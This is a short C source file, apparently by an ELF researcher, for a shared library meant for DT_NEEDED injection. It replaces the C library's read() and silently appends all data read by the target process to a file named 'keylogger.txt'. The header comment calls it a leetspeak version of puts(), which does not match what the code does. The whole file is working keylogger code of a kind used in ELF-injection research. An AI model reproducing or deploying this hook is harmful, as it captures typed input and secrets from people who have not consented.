/*
 * l33t sp34k version of puts() for DT_NEEDED .so injection
 * elfmaster 2/15/2019
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdbool.h>

#define OUTPUT_FILE "keylogger.txt"

ssize_t read(int fd, void *buf, size_t count)
{
	ssize_t (*o_read)(int, void *, size_t);
	o_read = (ssize_t (*)(int fd, void *, size_t))dlsym(RTLD_NEXT, "read");
	char *p = buf;
	char output[8];
	ssize_t b;
	int fd2;

	b = o_read(fd, buf, count);
	fd2 = open(OUTPUT_FILE, O_CREAT|O_WRONLY, 0777);
	if (fd2 < 0) {
		perror("open");
		exit(-1);
	}
	lseek(fd2, 0, SEEK_END);
	write(fd2, buf, b);
	close(fd2);
	return b;
}
